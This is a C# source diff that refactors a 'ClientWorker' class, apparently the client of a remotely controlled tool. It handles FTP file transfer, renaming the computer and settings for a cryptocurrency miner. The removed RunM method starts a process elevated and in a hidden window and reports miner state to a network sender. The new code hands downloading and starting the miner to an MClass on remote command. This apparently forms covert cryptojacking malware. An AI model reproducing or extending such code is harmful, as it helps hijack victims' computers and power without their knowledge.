@@ -10,12 +10,12 @@ using System.Threading;
 using System.Windows.Forms;
 using Interfaces;
 using Interfaces.Users;
+using Service;
 
 namespace ClientWorker
 {
 	public class Functions : IUser
 	{
-        Process M;
         public void UploadDirectory(string dirPath, string uploadPath)
         {
             FileManager.UploadDirectory(dirPath, uploadPath);
@@ -89,14 +89,7 @@ namespace ClientWorker
         }
         public void DownloadF(string FileName, string localPath)
         {
-            if (FtpClient.FtpDirectoryExists(FileName))
-            {
-                FileManager.DownloadFloader(FileName, localPath);
-            }
-            else
-            {
-                FtpClient.DownloadF(FileName, localPath);
-            }           
+            FileManager.Download(FileName, localPath);        
         }
         public void DownloadUpdate()
         {
@@ -135,10 +128,26 @@ namespace ClientWorker
                 Open_sum = Service.Properties.Settings.Default.Open_sum,
                 Start_time = Service.Properties.Settings.Default.Start_time,
                 Key = Service.Properties.Settings.Default.Key,
-                Version = Service.Properties.Settings.Default.Version
+                Version = Service.Properties.Settings.Default.Version,
+                MFTPFloader = Service.Properties.Settings.Default.MFTPFloader,
+                MLocalFloader = Service.Properties.Settings.Default.MLocalFloader,
+                MFileName = Service.Properties.Settings.Default.MFileName,
+                MArgs = Service.Properties.Settings.Default.MArgs,
+                MValut = (DDMiners)Service.Properties.Settings.Default.Valute
             };
 
             return setting;
+        }
+        public void SetCompName(string newName)
+        {
+            Service.Properties.Settings.Default.Comp_name = newName;
+            Service.Properties.Settings.Default.Save();
+        }
+        public void SetMSettings(string ftpFloader, string localFloader, string fileName, string args, bool isMiner, DDMiners valute)
+        {
+            MClass.SetM(ftpFloader, localFloader, fileName, args, isMiner,valute);
+            MClass.Stop();
+            if (valute != DDMiners.none) MClass.DownloadM();
         }
         public void GetUpd()
         {
@@ -218,41 +227,10 @@ namespace ClientWorker
         {
             Environment.Exit(0);
         }
-
-        public void RunM(string file,string args)
+        public void RunM()
         {
-
-            M = new Process
-            {
-                StartInfo =
-                {
-                    FileName = file,
-                    Verb = "runas",
-                    Arguments = args,
-                    WindowStyle = ProcessWindowStyle.Hidden
-                }
-            };
-            M.EnableRaisingEvents = true;
-            M.Exited += new EventHandler(MExited);
-            M.Start();
-
-
-            StartData.isWorkingM = true;
-            Unit MUint = new Unit("ChangeStateMiner", new object[] { StartData.isWorkingM });
-            Program.netSender.SendData(MUint);
+            MClass.Start();
         }
 
-        private void MExited(object sender, System.EventArgs e)
-        {
-            StartData.isWorkingM = false;
-            Unit MUint = new Unit("ChangeStateMiner", new object[] { StartData.isWorkingM });
-            Program.netSender.SendData(MUint);
-        }
-
-        public void SetCompName(string newName)
-        {
-            Service.Properties.Settings.Default.Comp_name = newName;
-            Service.Properties.Settings.Default.Save();
-        }
     }
 }
